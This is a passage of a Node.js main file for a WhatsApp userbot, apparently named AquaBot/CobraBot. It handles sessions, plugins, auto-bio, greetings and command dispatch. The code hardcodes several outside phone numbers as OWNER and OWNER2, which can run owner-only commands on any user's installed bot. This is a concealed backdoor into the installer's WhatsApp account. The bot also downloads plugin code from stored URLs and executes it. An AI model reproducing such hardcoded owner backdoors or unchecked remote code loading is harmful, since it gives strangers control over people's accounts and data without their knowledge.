const fs = require("fs");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./aqua');
const { DataTypes } = require('sequelize');
const { getMessage } = require("./plugins/sql/greetings");
const axios = require('axios');
const {uploadByBuffer} = require('cobrabot-patch')
const got = require('got');

// Sql
const cobraDB = config.DATABASE.define('cobrabot', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});

fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});

const plugindb = require('./plugins/sql/plugin');
var OWNER = { number: '94701629707,15712103262' }
const OWNER2 = '94706768067,0'
// . https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
   });
};
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function aquabot () {
    await config.DATABASE.sync();
    var Session_Db = await cobraDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    
    
    const cobrabotconn = new WAConnection();
    cobrabotconn.version = [3, 3234, 9];
    const Session = new StringSession();
    cobrabotconn.setMaxListeners(0);
    cobrabotconn.logger.level = config.DEBUG ? 'debug' : 'warn';
    var nodb;

    if (Session_Db.length < 1) {
        nodb = true;
        cobrabotconn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        cobrabotconn.loadAuthInfo(Session.deCrypt(Session_Db[0].dataValues.value));
    }

    cobrabotconn.on ('credentials-updated', async () => {
        console.log(
            chalk.blueBright.italic('✅ පිවිසුම් තොරතුරු යාවත්කාලීන කරන ලදි!')
        );

        const authInfo = cobrabotconn.base64EncodedAuthInfo();
        if (Session_Db.length < 1) {
            await cobraDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await Session_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    

    cobrabotconn.on('connecting', async () => {
        console.log(`${chalk.green.bold('Aqua')}${chalk.blue.bold('Bot')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
${chalk.blue.italic('ℹ️ WhatsApp වෙත සම්බන්ධ වෙමින් ... කරුණාකර රැඳී සිටින්න.')}`);
    });
    

    cobrabotconn.on('open', async () => {
        console.log(
            chalk.green.bold('✅ පුරනය වීම සාර්ථකයි!')
        );

        console.log(
            chalk.blueBright.italic('⬇️ බාහිර Plugin ස්ථාපනය කිරීම ...')
        );

        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });

        console.log(
            chalk.blueBright.italic('⬇️  Plugin ස්ථාපනය කිරීම ...')
        );

        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });

        console.log(
            chalk.green.bold('✅ Plugin ස්ථාපනය කර ඇත!')
       );
          var userjidlogo = await axios.get('https://i.ibb.co/P9tHKYX/Whats-App-Image-2022-02-01-at-18-51-53.jpg', { responseType: 'arraybuffer' })
        if (config.WORKTYPE == 'private') { 
         if (config.LANG == 'EN') { 
           
             var privateen = '*AQUABOT Working as Private!⛲*\n\n```Please do not try plugins here. This is your LOG number.```\n\n```You can use commands in any other chat :)```\n\n*Your bot is working as private.*\n*To change it, use* \n.setvar WORK_TYPE:public\n\n\n```Thanks For Using AQUABOT 🐳```'
             await cobrabotconn.sendMessage(cobrabotconn.user.jid, Buffer.from(userjidlogo.data), MessageType.image, {mimetype: Mimetype.jpg, caption: privateen});
             
         } else if (config.LANG == 'SI') {
             
             var privatesi = '*AQUABOT ප්‍රයිවට් ආකාරයට ක්‍රියා කරයි⛲*\n\n```කරුණාකර මෙහි plugins භාවිත නොකරන්න.මෙය ඔබගේ log අංකයයි.```\n\n```වෙනත් ඕනෑම chat එකක විධානයන් භාවිත කළ හැකිය.```\n\n*ඔබේ bot private ආකරයෙන් ක්‍රියාකරයි.*\n*එය වෙනස් කිරීමට* ,\n.setvar WORKTYPE:public\n*යන විධානය භාවිත කරන්න.*\n\n\n```AQUABOT භාවිත කරනවාට ස්තූතියි🐳```'
             await cobrabotconn.sendMessage(cobrabotconn.user.jid,Buffer.from(userjidlogo.data), MessageType.image, {mimetype: Mimetype.png, caption: privatesi})
        }
              }else if (config.WORKTYPE == 'public') { 
                  
         if (config.LANG == 'EN') { 
            var publicen = '*AQUABOT Working as Public!⛲*\n\n```Please do not try plugins here. This is your LOG number.```\n\n```You can use commands in any other chat :)```\n\n*Your bot is working as public.*\n*To change it, use* \n.setvar WORK_TYPE:private\n\n\n```Thanks For Using AQUABOT 🐳```'
              await cobrabotconn.sendMessage(cobrabotconn.user.jid,Buffer.from(userjidlogo.data), MessageType.image, {mimetype: Mimetype.png, caption: publicen})

         } else if (config.LANG == 'SI') {
             
             var publicsi = '*AQUABOT පබ්ලික් ආකාරයට ක්‍රියා කරයි⛲*\n\n```කරුණාකර මෙහි plugins භාවිත නොකරන්න.මෙය ඔබගේ log අංකයයි.```\n\n```වෙනත් ඕනෑම chat එකක විධානයන් භාවිත කළ හැකිය.```\n\n*ඔබේ bot public ආකරයෙන් ක්‍රියාකරයි.*\n*එය වෙනස් කිරීමට* ,\n.setvar WORKTYPE:private\n*යන විධානය භාවිත කරන්න.*\n\n\n```AQUABOT භාවිත කරනවාට ස්තූතියි🐳```'
              await cobrabotconn.sendMessage(cobrabotconn.user.jid,Buffer.from(userjidlogo.data), MessageType.image, {mimetype: Mimetype.png, caption: publicsi})
        }
       }
     });
  
    setInterval(async () => { 
        if (config.AUTOBIO == 'true') {
            if (cobrabotconn.user.jid.startsWith('90')) { 
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Europe/Istanbul' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n' + config.CAP_BIO
                await cobrabotconn.setStatus(biography)
            }
            else if (cobrabotconn.user.jid.startsWith('994')) { 
                var ov_time = new Date().toLocaleString('AZ', { timeZone: 'Asia/Baku' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n' + config.CAP_BIO
                await cobrabotconn.setStatus(biography)
            }
            else if (cobrabotconn.user.jid.startsWith('94')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Asia/Colombo' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n' + config.CAP_BIO
                await cobrabotconn.setStatus(biography)
            }
            else if (cobrabotconn.user.jid.startsWith('351')) { 
                var ov_time = new Date().toLocaleString('PT', { timeZone: 'Europe/Lisbon' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n' + config.CAP_BIO
                await cobrabotconn.setStatus(biography)
            }
            else if (cobrabotconn.user.jid.startsWith('75')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('RU', { timeZone: 'Europe/Kaliningrad' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n' + config.CAP_BIO
                await cobrabotconn.setStatus(biography)
            }
            else if (cobrabotconn.user.jid.startsWith('91')) { 
                var ov_time = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n' + config.CAP_BIO
                await cobrabotconn.setStatus(biography)
            }
            else if (cobrabotconn.user.jid.startsWith('62')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('ID', { timeZone: 'Asia/Jakarta' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n' + config.CAP_BIO
                await cobrabotconn.setStatus(biography)
            }
            else if (cobrabotconn.user.jid.startsWith('49')) { 
                var ov_time = new Date().toLocaleString('DE', { timeZone: 'Europe/Berlin' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n' + config.CAP_BIO
                await cobrabotconn.setStatus(biography)
            }
            else if (cobrabotconn.user.jid.startsWith('61')) {  
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('AU', { timeZone: 'Australia/Lord_Howe' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n' + config.CAP_BIO
                await cobrabotconn.setStatus(biography)
            }
            else if (cobrabotconn.user.jid.startsWith('55')) { 
                var ov_time = new Date().toLocaleString('BR', { timeZone: 'America/Noronha' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n' + config.CAP_BIO
                await cobrabotconn.setStatus(biography)
            }
            else if (cobrabotconn.user.jid.startsWith('33')) {
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('FR', { timeZone: 'Europe/Paris' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n' + config.CAP_BIO
                await cobrabotconn.setStatus(biography)
            }
            else if (cobrabotconn.user.jid.startsWith('34')) { 
                var ov_time = new Date().toLocaleString('ES', { timeZone: 'Europe/Madrid' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n' + config.CAP_BIO
                await cobrabotconn.setStatus(biography)
            }
            else if (cobrabotconn.user.jid.startsWith('44')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('GB', { timeZone: 'Europe/London' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n' + config.CAP_BIO
                await cobrabotconn.setStatus(biography)
            }
            else if (cobrabotconn.user.jid.startsWith('39')) {  
                var ov_time = new Date().toLocaleString('IT', { timeZone: 'Europe/Rome' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n' + config.CAP_BIO
                await cobrabotconn.setStatus(biography)
            }
            else if (cobrabotconn.user.jid.startsWith('7')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('KZ', { timeZone: 'Asia/Almaty' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n' + config.CAP_BIO
                await cobrabotconn.setStatus(biography)
            }
            else if (cobrabotconn.user.jid.startsWith('998')) {  
                var ov_time = new Date().toLocaleString('UZ', { timeZone: 'Asia/Samarkand' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n' + config.CAP_BIO
                await cobrabotconn.setStatus(biography)
            }
            else if (cobrabotconn.user.jid.startsWith('993')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('TM', { timeZone: 'Asia/Ashgabat' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n' + config.CAP_BIO
                await cobrabotconn.setStatus(biography)
            }
            else {
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('EN', { timeZone: 'America/New_York' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n' + config.CAP_BIO
                await cobrabotconn.setStatus(biography)
            }
        }
    }, 7890);  
   
    cobrabotconn.on('chat-update', async m => {
        if (!m.hasNewMessage) return;
        if (!m.messages && !m.count) return;
        let msg = m.messages.all()[0];
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (config.NO_ONLINE) {
            await cobrabotconn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
                                // ==================== Greetings ====================
     if (msg.messageStubType === 32 || msg.messageStubType === 28) {
  var gb = await getMessage(msg.key.remoteJid, 'goodbye');
  if ( config.LOGO_BYE.includes('.mp4')) {
  var byelogo = await axios.get(config.LOGO_BYE, { responseType: 'arraybuffer' })
   if (gb !== false) {
      await cobrabotconn.sendMessage(msg.key.remoteJid, Buffer.from(byelogo.data), MessageType.video, {mimetype: Mimetype.gif , caption:  gb.message})
      }}else {
      var byelogo = await axios.get(config.LOGO_BYE, { responseType: 'arraybuffer' })
   if (gb !== false) {
      await cobrabotconn.sendMessage(msg.key.remoteJid, Buffer.from(byelogo.data), MessageType.image, {mimetype: Mimetype.png , caption:  gb.message})
      }
      }
      return; 
      }
      else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            var gb = await getMessage(msg.key.remoteJid);
            if ( config.LOGO_WELCOME.includes('.mp4')) {
  var wellogo = await axios.get(config.LOGO_WELCOME, { responseType: 'arraybuffer' })
   if (gb !== false) {
      await cobrabotconn.sendMessage(msg.key.remoteJid, Buffer.from(wellogo.data), MessageType.video, {mimetype: Mimetype.gif , caption:  gb.message})
      }}else {
      var wellogo = await axios.get(config.LOGO_WELCOME, { responseType: 'arraybuffer' })
   if (gb !== false) {
      await cobrabotconn.sendMessage(msg.key.remoteJid, Buffer.from(wellogo.data), MessageType.image, {mimetype: Mimetype.png , caption:  gb.message})
      }
      }
      return; 
      }
                                // ==================== End Greetings ====================

                                // ==================== Blocked Chats ====================
         if (config.BLOCKCHAT !== false) {     
            var abc = config.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT == '393475528094-1415817281') {     
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT2 == '96176912958-1458298055') {     
            var tsup = config.SUPPORT2.split(',');                            
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT3 == '393472769604-1446476993') {     
            var nsup = config.SUPPORT3.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
         if (config.Support4 == '94701629707-1630672792') {     
            var nsup = config.Support4.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
         if (config. AMDI_1 == '94757405652-1533638214') {     
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
       
         if (config. AMDI_3 == '94757405652-1631633729') {     
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
         if (config. AMDI_4 == '94757405652-1631905677') {     
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
         if (config. AMDI_5 == '94757405652-1636094186') {     
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
         if (config. AMDI_6 == '972542559113-1376904403') {     
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
         if (config. AMDI_7 == '94757405652-1636286090') {     
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        
        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                }else if (msg.message && msg.message.buttonsResponseMessage && msg.message.buttonsResponseMessage.selectedButtonId ){
                    var text_msg = msg.message.buttonsResponseMessage.selectedButtonId;
                }else if (msg.message && msg.message.templateButtonReplyMessage && msg.message.templateButtonReplyMessage.selectedId ){
                    var text_msg = msg.message.templateButtonReplyMessage.selectedId;
                }else if (msg.message && msg.message.listResponseMessage && msg.message.listResponseMessage.selectedRowId ){
                    var text_msg = msg.message.listResponseMessage.selectedRowId;
                }else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = cobrabotconn.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWNER.number == "94701629707,15712103262" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWNER.number.includes(',') ? OWNER.number.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWNER.number || OWNER.number.includes(',') ? OWNER.number.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWNER.number)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWNER2 == '94706768067,0' && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWNER2.includes(',') ? OWNER2.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWNER2 || OWNER2.includes(',') ? OWNER2.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWNER2)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await cobrabotconn.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(cobrabotconn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(cobrabotconn, msg);
                        } else {
                            whats = new Message(cobrabotconn, msg);
                        }
                        if (msg.key.fromMe && command.deleteCommand) { 
                            var wrs = cobrabotconn.user.phone.wa_version.split('.')[2]
                            if (wrs < 11) {
                                await whats.delete() 
                            }
                        } 
                        // ==================== End Message Catcher ====================

                        // ==================== Error Message ====================
                        try {
                            await command.function(whats, match);
                        }
                        catch (error) {
                            if (config.NOLOG == 'true') return;

                            if (config.LANG == 'SI') {
                                await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*♦︎✧දෝෂ වාර්තාව (🐋AQUABOT 🐋)✧♦︎*' + 
                                    '\n*AQUABOT දෝෂයක් සිදු වී ඇත!*'+
                                    '\n_මෙම දෝශ ලඝු සටහනෙහි ඔබේ අංකය හෝ සගයෙකුගේ අංකය ඇතුළත් විය හැකිය. කරුණාකර එය සමග සැලකිලිමත් වන්න!_' +
                                    '\n_දෝෂය පිළීබඳ Admin දැනුවත් කරන්න._' +
                                    '\n_උදව් සඳහා ඔබට අපගේ Whatsapp කණ්ඩායමට ලිවිය හැකිය._' +
                                    '\n_ඔබට දෝෂය මෙම කණ්ඩායමට යොමු කළ හැකිය https://chat.whatsapp.com/FgPh5cqjcw53qnAXQiBCK0 ._\n\n' +
                                    '*සිදුවන දෝෂය:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: false});

                                if (error.message.includes('URL')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*♦︎✧දෝෂ විසඳුම (🐋AQUABOT 🐋)✧♦︎*' + 
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝෂය:* _සහය දක්වන්නේ නියත වශයෙන්ම URL පමණි_' +
                                        '\n*හේතුව:* _LOG අංකය තුළ මාධ්‍ය මෙවලම් (xmedia, ස්ටිකර් ..) භාවිතය._' +
                                        '\n*විසඳුම:* _විධානය LOG අංකය හැර වෙනත් ඕනෑම කතාබහක භාවිතා කළ හැකිය._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*♦︎✧දෝෂ විසඳුම (🐋AQUABOT 🐋)✧♦︎*' + 
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝෂය:* _SQL දත්ත සමුදාය දෝෂය_' +
                                        '\n*හේතුව:* _දත්ත සමුදාය දූෂණය වීම._ ' +
                                        '\n*විසඳුම:* _දන්නා විසඳුමක් නැත. ඔබට නැවත ස්ථාපනය කිරීමට උත්සාහ කළ හැකිය._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*♦︎✧දෝෂ විසඳුම (🐋AQUABOT 🐋)✧♦︎*' + 
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝෂය:* _නිර්වචනය නොකළ බෙදීම_' +
                                        '\n*හේතුව:* _කණ්ඩායම් පරිපාලකයින්ට භාවිතා කළ හැකි විධානයන්ට බෙදීමේ ක්‍රියාකාරකම වරින් වර දැක ගැනීමට නොහැකි වේ._ ' +
                                        '\n*විසඳුම:* _නැවත පණ ගැන්වීම ප්‍රමාණවත්.._'
                                        , MessageType.text
                                    );                               
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*♦︎✧දෝෂ විසඳුම (🐋AQUABOT 🐋)✧♦︎*' + 
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*Ana Hata:* _Ookla සේවාදායක සම්බන්ධතාවය_' +
                                        '\n*හේතුව:* _සේවාදායකයට වේගවත්ම දත්ත සම්ප්‍රේෂණය කිරීමට නොහැකි වීම._' +
                                        '\n*විසඳුම:* _ඔබ එය නැවත වරක් භාවිතා කළහොත් ගැටළුව විසඳනු ඇත._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*♦︎✧දෝෂ විසඳුම (🐋AQUABOT 🐋)✧♦︎*' + 
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝෂය:* _ඉල්ලූ ශ්‍රව්‍ය පරාමිතීන්_' +
                                        '\n*හේතුව:* _ලතින් හෝඩියේ පිටත TTS විධානය භාවිතා කිරීම._' +
                                        '\n*විසඳුම:* _ඔබ ලතින් අකුරින් විධානය භාවිතා කළහොත් ගැටළුව විසඳනු ඇත._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*♦︎✧දෝෂ විසඳුම (🐋AQUABOT 🐋)✧♦︎*' + 
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝෂය:* _එවැනි ගොනුවක් හමු නොවීය.' +
                                        '\n*හේතුව:* _Plugin වැරදි කේතීකරණය._' +
                                        '\n*විසඳුම:* _කරුණාකර ඔබේ Plugin කේත පරීක්‍ෂා කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*♦︎✧දෝෂ විසඳුම (🐋AQUABOT 🐋)✧♦︎*' + 
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝෂය:* _දෝෂ 404 HTTPS_' +
                                        '\n*හේතුව:* _හෙරෝකු Plugin යටතේ ඇති විධානයන් භාවිතා කිරීම හේතුවෙන් සේවාදායකය සමඟ සන්නිවේදනය කිරීමට නොහැකි විය._' +
                                        '\n*විසඳුම:* _ටික වේලාවක් බලා නැවත උත්සාහ කරන්න. ඔබ තවමත් දෝෂයක් ලබා ගන්නේ නම්, වෙබ් අඩවියේ මෙහෙයුම සිදු කරන්න.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*♦︎✧දෝෂ විසඳුම (🐋AQUABOT 🐋)✧♦︎*' + 
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝෂය:* _පිළිතුර මකන්න කාර්යය_' +
